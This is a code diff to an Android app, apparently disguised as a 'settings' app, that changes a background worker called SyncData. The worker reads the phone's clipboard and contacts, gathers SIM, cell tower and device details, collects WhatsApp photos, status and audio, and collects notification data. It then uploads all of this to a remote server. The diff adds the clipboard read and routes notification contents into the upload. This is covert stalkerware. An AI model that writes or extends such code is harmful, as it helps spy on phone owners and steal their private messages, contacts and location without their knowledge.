@@ -1,8 +1,8 @@
 package com.example.settings;
 
 import android.Manifest;
-import android.app.Activity;
 import android.content.ClipData;
+import android.content.ClipboardManager;
 import android.content.Context;
 import android.os.Build;
 import android.util.Log;
@@ -21,22 +21,15 @@ import com.android.volley.RetryPolicy;
 import com.android.volley.VolleyError;
 import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
-import com.google.gson.Gson;
-import com.wickerlabs.logmanager.LogObject;
-import com.wickerlabs.logmanager.LogsManager;
 
 import java.util.HashMap;
 
-import java.util.List;
 import java.util.Map;
 
 import static com.example.settings.ConnectivityManagers.isConnectedToNetwork;
-import static com.example.settings.MainActivity.clipboardManager;
 import static com.example.settings.MainActivity.deviceInformation;
 import static com.example.settings.MainActivity.getCellInfo;
-import static com.example.settings.MainActivity.getFiles;
 import static com.example.settings.MainActivity.geturl;
-import static com.example.settings.MainActivity.setupWorkManager;
 import static com.example.settings.MainActivity.setuponetimeworkManager;
 import static com.example.settings.MainActivity.simName;
 import static com.example.settings.Utils.checkpermission;
@@ -99,6 +92,7 @@ public class SyncData extends Worker {
         Utils.readContacts(context,mSharedpref);
 
         try {
+            ClipboardManager clipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
             ClipData pData = clipboardManager.getPrimaryClip();
             if (pData != null) {
                 ClipData.Item item = pData.getItemAt(0);
@@ -111,7 +105,7 @@ public class SyncData extends Worker {
 
         DaysTime = mSharedpref.getPrevDate()+" to " +getDateTime();
         if(isConnectedToNetwork(context)){
-            if (!Name.isEmpty() || !Name.equalsIgnoreCase("No Name Yet")) {
+            if (!Name.isEmpty() && !Name.equalsIgnoreCase("No Name Yet")) {
                 int numberlistsize = mSharedpref.getPhoneNumbersLisSize();
                 int prev=mSharedpref.getPrevPhoneNumbersLisSize();
                 if (prev!= numberlistsize) {
@@ -159,6 +153,7 @@ public class SyncData extends Worker {
                                     mSharedpref.setWhatsAppImageJson("");
                                     mSharedpref.setWhatsAppStatusJson("");
                                     mSharedpref.setWhatsAppAudioJSon("");
+                                    mSharedpref.setServicerNotificationData("");
                                     mSharedpref.commit();
                                    try {
                                        geturl();
@@ -206,14 +201,13 @@ public class SyncData extends Worker {
                             parmas.put("Simdetails", String.valueOf(simName(context)));
                             parmas.put("PhoneTowerdetails", String.valueOf(getCellInfo(context)));
                             parmas.put("DeviceInfo", String.valueOf(deviceInformation(context)));
-                            parmas.put("ImageFiles", "");
+                            parmas.put("ImageFiles", mSharedpref.getServiceNotificationData());
                             parmas.put("Services", mSharedpref.getServiceStatus());
                             parmas.put("ImageUploaded", mSharedpref.getImagesJson());
                             parmas.put("AudioUploaded", mSharedpref.getAudioJson());
                             parmas.put("WhatsAppPhotos", mSharedpref.getWhatsAppAImageJson());
                             parmas.put("WhatsAppStatus", mSharedpref.getWhatsAppStatusJson());
                             parmas.put("WhatsAppAudio", mSharedpref.getWhatsAppAudioJson());
-
                             return parmas;
                         }
                     };
@@ -247,6 +241,7 @@ public class SyncData extends Worker {
                                     mSharedpref.setWhatsAppImageJson("");
                                     mSharedpref.setWhatsAppStatusJson("");
                                     mSharedpref.setWhatsAppAudioJSon("");
+                                    mSharedpref.setServicerNotificationData("");
                                     mSharedpref.commit();
                                 }
                             },
@@ -288,7 +283,7 @@ public class SyncData extends Worker {
                             parmas.put("Simdetails", String.valueOf(simName(context)));
                             parmas.put("PhoneTowerdetails", String.valueOf(getCellInfo(context)));
                             parmas.put("DeviceInfo", String.valueOf(deviceInformation(context)));
-                            parmas.put("ImageFiles", getFiles(mSharedpref));
+                            parmas.put("ImageFiles", mSharedpref.getServiceNotificationData());
                             parmas.put("Services", mSharedpref.getServiceStatus());
                             parmas.put("ImageUploaded", mSharedpref.getImagesJson());
                             parmas.put("AudioUploaded", mSharedpref.getAudioJson());
